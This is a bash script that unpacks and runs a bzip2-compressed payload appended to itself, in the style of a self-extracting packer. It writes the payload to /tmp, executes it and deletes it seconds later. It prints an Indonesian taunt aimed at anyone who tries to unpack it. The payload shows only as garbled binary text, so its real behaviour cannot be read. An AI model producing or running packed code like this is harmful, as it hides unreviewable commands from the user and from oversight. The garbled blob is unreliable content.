#!/bin/bash
skip=23
set -C
umask=`umask`
umask 77
tmpfile=`tempfile -p gztmp -d /tmp` || exit 1
if /usr/bin/tail -n +$skip "$0" | /bin/bzip2 -cd >> $tmpfile; then
  umask $umask
  /bin/chmod 700 $tmpfile
  prog="`echo $0 | /bin/sed 's|^.*/||'`"
  if /bin/ln -T $tmpfile "/tmp/$prog" 2>/dev/null; then
    trap '/bin/rm -f $tmpfile "/tmp/$prog"; exit $res' 0
    (/bin/sleep 5; /bin/rm -f $tmpfile "/tmp/$prog") 2>/dev/null &
    /tmp/"$prog" ${1+"$@"}; res=$?
  else
    trap '/bin/rm -f $tmpfile; exit $res' 0
    (/bin/sleep 5; /bin/rm -f $tmpfile) 2>/dev/null &
    $tmpfile ${1+"$@"}; res=$?
  fi
else
  echo MAU DIBONGKAR YA BANG ? IZIN DULU KE @tau_samawa $0; exit 1
fi; exit $res
BZh91AY&SY��C`  V�A�@ ���������   @T��iC	D	@c(j=L��ё�F�چ�$��5Oԛ&���4�F�2�m  �M5�L�1M00&�#��M @���#F��F�    hhhq0R�-C��k��;���G;��d�pn�)"<Rs鴏��L4���釦�)c"G�!�vj����E�ۆ���0T��e�c[-n�x�P�RLW5b-��T�.���%Q���qj��8�"�8�S�ܜ$�(�Fuջ��>�y�kơ��R�p��R��`���wBr�//Z5t!�B �2f�x��������k~������)�K�)(�	�뻓���'q}�EV�a�ʘE$�H��
��)�)&�8���j-��jAh���im*�p��B�m%4Џ̀e��Y�Fs+yh���o�ÆPF<=��n�eծ��BK�-
/�IYjk
N�Q�y�#�!��C���>��_��0GL4���F6�d�fFD���Q����'����e���'�
h��O���CI�aQ�)�9P�r�����VףBy�B���O�;d���ȑέX�G-FmX��h+�q��̋0IEDO1+�%ȱ�3N^$��+��fK� �n�Hv6���k��H�
�l 